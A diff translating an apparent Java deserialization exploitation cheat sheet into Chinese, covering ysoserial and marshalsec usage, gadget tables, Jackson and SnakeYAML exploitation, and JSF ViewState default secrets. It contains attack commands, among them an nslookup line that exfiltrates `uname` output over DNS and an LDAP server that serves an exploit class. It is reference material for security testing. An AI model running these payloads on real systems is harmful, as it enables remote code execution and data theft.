@@ -1,32 +1,34 @@
-# Java Deserialization
+[原文文档](Java.en.md)
 
-> Java serialization is the process of converting a Java object’s state into a byte stream, which can be stored or transmitted and later reconstructed (deserialized) back into the original object. Serialization in Java is primarily done using the `Serializable` interface, which marks a class as serializable, allowing it to be saved to files, sent over a network, or transferred between JVMs.
+# Java 反序列化
 
-## Summary
+> Java 序列化是将 Java 对象的状态转换为字节流的过程，该字节流可以存储或传输，然后稍后重建（反序列化）回原始对象。Java 中的序列化主要使用 `Serializable` 接口完成，该接口将类标记为可序列化，允许将其保存到文件、通过网络发送或在 JVM 之间传输。
 
-* [Detection](#detection)
-* [Tools](#tools)
+## 摘要
+
+* [检测](#检测)
+* [工具](#工具)
     * [Ysoserial](#ysoserial)
-    * [Burp extensions using ysoserial](#burp-extensions)
-    * [Alternative Tooling](#alternative-tooling)
-* [YAML Deserialization](#yaml-deserialization)
+    * [使用 ysoserial 的 Burp 扩展](#burp-扩展)
+    * [替代工具](#替代工具)
+* [YAML 反序列化](#yaml-反序列化)
 * [ViewState](#viewstate)
-* [References](#references)
+* [参考资料](#参考资料)
 
-## Detection
+## 检测
 
-* `"AC ED 00 05"` in Hex
-    * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.
-    * `00 05`: STREAM_VERSION. The serialization version.
-* `"rO0"` in Base64
+* `"AC ED 00 05"` 十六进制
+    * `AC ED`: STREAM_MAGIC。指定这是序列化协议。
+    * `00 05`: STREAM_VERSION。序列化版本。
+* `"rO0"` Base64
 * `Content-Type` = "application/x-java-serialized-object"
-* `"H4sIAAAAAAAAAJ"` in gzip(base64)
+* `"H4sIAAAAAAAAAJ"` gzip(base64)
 
-## Tools
+## 工具
 
 ### Ysoserial
 
-[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
+[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : 一个概念验证工具，用于生成利用不安全 Java 对象反序列化的有效载荷。
 
 ```java
 java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
@@ -35,9 +37,9 @@ java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
 java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
 ```
 
-**List of payloads included in ysoserial:**
+**ysoserial 中包含的有效载荷列表：**
 
-| Payload             | Authors                                | Dependencies |
+| 有效载荷             | 作者                                | 依赖项 |
 | ------------------- | -------------------------------------- | --- |
 | AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2 |
 | BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5 |
@@ -74,23 +76,23 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | b
 | Vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
 | Wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4 |
 
-### Burp extensions
+### Burp 扩展
 
-* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) -  Burp extension to perform Java Deserialization Attacks
-* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) -  All-in-one plugin for Burp Suite for the detection and the exploitation of Java deserialization vulnerabilities
-* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) -  YSOSERIAL Integration with Burp Suite
-* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java Deserialization Vulnerability Identification
-* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java Deserialization Vulnerability Active Identification Burp Extender
+* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) - 执行 Java 反序列化攻击的 Burp 扩展
+* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) - 用于 Burp Suite 的一体化插件，用于检测和利用 Java 反序列化漏洞
+* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) - 与 Burp Suite 集成的 YSOSERIAL
+* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java 反序列化漏洞识别
+* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java 反序列化漏洞主动识别 Burp 扩展器
 
-### Alternative Tooling
+### 替代工具
 
-* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - Pure JRE 8 RCE Deserialization gadget
-* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
-* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - A fork of the original ysoserial application
-* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool
-* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form
-* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - Exploiting Deserialization to Brute-Force the Remote Classpath
-* [k3idii/Deserek](https://github.com/k3idii/Deserek) - Python code to Serialize and Unserialize java binary serialization format.
+* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - 纯 JRE 8 RCE 反序列化小工具
+* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss（和其他 Java 反序列化漏洞）验证和利用工具
+* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - 原始 ysoserial 应用程序的分支
+* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java 序列化暴力破解攻击工具
+* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - 以更易读的形式转储 Java 序列化流的工具
+* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - 利用反序列化暴力破解远程类路径
+* [k3idii/Deserek](https://github.com/k3idii/Deserek) - 用于序列化和反序列化 java 二进制序列化格式的 Python 代码。
 
   ```java
   java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
@@ -99,40 +101,40 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | b
   java -cp JavaSerializationTestSuite DeSerial yss_new.bin
   ```
 
-* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Turning your data into code execution
+* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java 反序列化器安全 - 将您的数据转化为代码执行
 
   ```java
   $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
   $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
   $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
-  // -a - generates/tests all payloads for that marshaller
-  // -t - runs in test mode, unmarshalling the generated payloads after generating them.
-  // -v - verbose mode, e.g. also shows the generated payload in test mode.
-  // gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
-  // arguments - Gadget specific arguments
+  // -a - 为该反序列化器生成/测试所有有效载荷
+  // -t - 在测试模式下运行，在生成它们后反序列化生成的有效载荷。
+  // -v - 详细模式，例如在测试模式下也显示生成的有效载荷。
+  // gadget_type - 特定小工具的标识符，如果省略将显示该特定反序列化器的可用小工具。
+  // arguments - 小工具特定参数
   ```
 
-Payload generators for the following marshallers are included:
+包含以下反序列化器的有效载荷生成器：
 
-| Marshaller                      | Gadget Impact                                |
+| 反序列化器                      | 小工具影响                                |
 | ------------------------------- | ---------------------------------------------- |
-| BlazeDSAMF(0&#124;3&#124;X)     | JDK only escalation to Java serialization various third party libraries RCEs |
-| Hessian&#124;Burlap             | various third party RCEs |
-| Castor                          | dependency library RCE |
-| Jackson                         | **possible JDK only RCE**, various third party RCEs |
-| Java                            | yet another third party RCE |
-| JsonIO                          | **JDK only RCE** |
-| JYAML                           | **JDK only RCE** |
-| Kryo                            | third party RCEs |
-| KryoAltStrategy                 | **JDK only RCE** |
-| Red5AMF(0&#124;3)               | **JDK only RCE** |
-| SnakeYAML                       | **JDK only RCEs** |
-| XStream                         | **JDK only RCEs** |
-| YAMLBeans                       | third party RCE |
+| BlazeDSAMF(0&#124;3&#124;X)     | JDK 仅升级到 Java 序列化各种第三方库 RCE |
+| Hessian&#124;Burlap             | 各种第三方 RCE |
+| Castor                          | 依赖库 RCE |
+| Jackson                         | **可能的 JDK 仅 RCE**，各种第三方 RCE |
+| Java                            | 又一个第三方 RCE |
+| JsonIO                          | **JDK 仅 RCE** |
+| JYAML                           | **JDK 仅 RCE** |
+| Kryo                            | 第三方 RCE |
+| KryoAltStrategy                 | **JDK 仅 RCE** |
+| Red5AMF(0&#124;3)               | **JDK 仅 RCE** |
+| SnakeYAML                       | **JDK 仅 RCE** |
+| XStream                         | **JDK 仅 RCE** |
+| YAMLBeans                       | 第三方 RCE |
 
-## JSON Deserialization
+## JSON 反序列化
 
-Multiple libraries can be used to handle JSON in Java.
+可以使用多个库来处理 Java 中的 JSON。
 
 * [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)
 * [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
@@ -143,10 +145,10 @@ Multiple libraries can be used to handle JSON in Java.
 
 **Jackson**:
 
-Jackson is a popular Java library used for working with JSON (JavaScript Object Notation) data.
-Jackson-databind supports Polymorphic Type Handling (PTH), formerly known as "Polymorphic Deserialization", which is disabled by default.
+Jackson 是一个流行的 Java 库，用于处理 JSON (JavaScript Object Notation) 数据。
+Jackson-databind 支持多态类型处理 (PTH)，以前称为"多态反序列化"，默认情况下是禁用的。
 
-To determine if the backend is using Jackson, the most common technique is to send an invalid JSON and inspect the error message. Look for references to either of those:
+要确定后端是否使用 Jackson，最常见的技术是发送无效的 JSON 并检查错误消息。查找对以下任一内容的引用：
 
 ```java
 Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
@@ -155,7 +157,7 @@ Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.
 * com.fasterxml.jackson.databind
 * org.codehaus.jackson.map
 
-**Exploitation**:
+**利用**:
 
 * **CVE-2017-7525**
 
@@ -218,7 +220,7 @@ Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.
     ]
     ```
 
-## YAML Deserialization
+## YAML 反序列化
 
 * [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)
 * [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)
@@ -226,7 +228,7 @@ Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.
 
 **SnakeYAML**:
 
-SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YAML Ain't Markup Language) data. It provides an easy-to-use API for working with YAML, a human-readable data serialization standard commonly used for configuration files and data exchange.
+SnakeYAML 是一个流行的基于 Java 的库，用于解析和发出 YAML (YAML Ain't Markup Language) 数据。它为处理 YAML 提供了一个易于使用的 API，YAML 是一种人类可读的数据序列化标准，通常用于配置文件和数据交换。
 
 ```yaml
 !!javax.script.ScriptEngineManager [
@@ -238,42 +240,42 @@ SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YA
 
 ## ViewState
 
-In Java, ViewState refers to the mechanism used by frameworks like JavaServer Faces (JSF) to maintain the state of UI components between HTTP requests in web applications. There are 2 major implementations:
+在 Java 中，ViewState 指的是 JavaServer Faces (JSF) 等框架用于在 Web 应用程序中的 HTTP 请求之间维护 UI 组件状态的机制。有 2 个主要实现：
 
-* Oracle Mojarra (JSF reference implementation)
+* Oracle Mojarra (JSF 参考实现)
 * Apache MyFaces
 
-**Tools**:
+**工具**:
 
-* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool
-* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace is a software used to patch unencrypted and unsigned JSF ViewStates.
+* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss：JBoss（和 Java 反序列化漏洞）验证和利用工具
+* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace 是一个用于修补未加密和未签名 JSF ViewState 的软件。
 
-### Encoding
+### 编码
 
-| Encoding      | Starts with |
+| 编码      | 开始于 |
 | ------------- | ----------- |
 | base64        | `rO0`       |
 | base64 + gzip | `H4sIAAA`   |
 
-### Storage
+### 存储
 
-The `javax.faces.STATE_SAVING_METHOD` is a configuration parameter in JavaServer Faces (JSF). It specifies how the framework should save the state of a component tree (the structure and data of UI components on a page) between HTTP requests.
+`javax.faces.STATE_SAVING_METHOD` 是 JavaServer Faces (JSF) 中的一个配置参数。它指定框架应如何在 HTTP 请求之间保存组件树（页面上 UI 组件的结构和数据）的状态。
 
-The storage method can also be inferred from the viewstate representation in the HTML body.
+还可以从 HTML 正文中的 viewstate 表示推断存储方法。
 
-* **Server side** storage: `value="-XXX:-XXXX"`
-* **Client side** storage: `base64 + gzip + Java Object`
+* **服务器端**存储: `value="-XXX:-XXXX"`
+* **客户端**存储: `base64 + gzip + Java 对象`
 
-### Encryption
+### 加密
 
-By default MyFaces uses DES as encryption algorithm and HMAC-SHA1 to authenticate the ViewState. It is possible and recommended to configure more recent algorithms like AES and HMAC-SHA256.
+默认情况下，MyFaces 使用 DES 作为加密算法，使用 HMAC-SHA1 来验证 ViewState。可以并且建议配置更 recent 的算法，如 AES 和 HMAC-SHA256。
 
-| Encryption Algorithm | HMAC        |
+| 加密算法 | HMAC        |
 | -------------------- | ----------- |
-| DES ECB (default)    | HMAC-SHA1   |
+| DES ECB (默认)    | HMAC-SHA1   |
 
-Supported encryption methods are BlowFish, 3DES, AES and are defined by a context parameter.
-The value of these parameters and their secrets can be found inside these XML clauses.
+支持的加密方法是 BlowFish、3DES、AES，并由上下文参数定义。
+这些参数的值及其秘密可以在这些 XML 子句中找到。
 
 ```xml
 <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   
@@ -281,9 +283,9 @@ The value of these parameters and their secrets can be found inside these XML cl
 <param-name>org.apache.myfaces.MAC_SECRET</param-name>
 ```
 
-Common secrets from the [documentation](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application).
+来自[文档](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application)的常见密钥。
 
-| Name                 | Value                              |
+| 名称                 | 值                              |
 | -------------------- | ---------------------------------- |
 | AES CBC/PKCS5Padding | `NzY1NDMyMTA3NjU0MzIxMA==`         |
 | DES                  | `NzY1NDMyMTA=<`                    |
@@ -292,24 +294,24 @@ Common secrets from the [documentation](https://cwiki.apache.org/confluence/disp
 | AES CBC              | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
 | AES CBC IV           | `NzY1NDMyMTA3NjU0MzIxMA==`         |
 
-* **Encryption**: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState
-* **Decryption**: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data
+* **加密**: 数据 -> 加密 -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState
+* **解密**: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> 解密 -> 数据
 
-## References
+## 参考资料
 
-* [Detecting deserialization bugs with DNS exfiltration - Philippe Arteau - March 22, 2017](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
-* [Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill - October 4, 2017](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)
-* [Hack The Box - Arkham - 0xRick - August 10, 2019](https://0xrick.github.io/hack-the-box/arkham/)
-* [How I found a $1500 worth Deserialization vulnerability - Ashish Kunwar - August 28, 2018](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
-* [Jackson CVE-2019-12384: anatomy of a vulnerability class - Andrea Brancaleoni - July 22, 2019](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
-* [Jackson gadgets - Anatomy of a vulnerability - Andrea Brancaleoni - 22 Jul 2019](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
-* [Jackson Polymorphic Deserialization - FasterXML - July 23, 2020](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)
-* [Java Deserialization Cheat Sheet - Aleksei Tiurin - May 23, 2023](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
-* [Java Deserialization in ViewState - Haboob Team - December 23, 2020](https://www.exploit-db.com/docs/48126)
-* [JSF ViewState upside-down - Renaud Dubourguais, Nicolas Collignon - March 15, 2016](https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
-* [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
-* [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)
-* [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin (@artsploit) - June 29, 2021](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
-* [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com - July 5, 2020](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
-* [Understanding & practicing java deserialization exploits - Diablohorn - September 9, 2017](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
-* [Friday the 13th JSON Attacks - Alvaro Muñoz & Oleksandr Mirosh - July 28, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
+* [使用 DNS 渗出检测反序列化错误 - Philippe Arteau - 2017 年 3 月 22 日](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
+* [利用 Jackson RCE：CVE-2017-7525 - Adam Caudill - 2017 年 10 月 4 日](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)
+* [Hack The Box - Arkham - 0xRick - 2019 年 8 月 10 日](https://0xrick.github.io/hack-the-box/arkham/)
+* [我如何找到一个价值 1500 美元的反序列化漏洞 - Ashish Kunwar - 2018 年 8 月 28 日](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
+* [Jackson CVE-2019-12384：漏洞类别的剖析 - Andrea Brancaleoni - 2019 年 7 月 22 日](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
+* [Jackson 小工具 - 漏洞的剖析 - Andrea Brancaleoni - 2019 年 7 月 22 日](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
+* [Jackson 多态反序列化 - FasterXML - 2020 年 7 月 23 日](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)
+* [Java 反序列化备忘单 - Aleksei Tiurin - 2023 年 5 月 23 日](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
+* [ViewState 中的 Java 反序列化 - Haboob Team - 2020 年 12 月 23 日](https://www.exploit-db.com/docs/48126)
+* [JSF ViewState 颠倒 - Renaud Dubourguais, Nicolas Collignon - 2016 年 3 月 15 日](https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
+* [错误配置的 JSF ViewState 可能导致严重的 RCE 漏洞 - Peter Stöckli - 2017 年 8 月 14 日](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
+* [关于 Jackson CVE：不要恐慌——这是您需要知道的 - cowtowncoder - 2017 年 12 月 22 日](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)
+* [ForgeRock OpenAM 中的预认证 RCE（CVE-2021-35464）- Michael Stepankin (@artsploit) - 2021 年 6 月 29 日](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
+* [使用 Java 反序列化触发 DNS 查找 - paranoidsoftware.com - 2020 年 7 月 5 日](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
+* [理解和实践 java 反序列化利用 - Diablohorn - 2017 年 9 月 9 日](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
+* [星期五 13 日 JSON 攻击 - Alvaro Muñoz & Oleksandr Mirosh - 2017 年 7 月 28 日](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
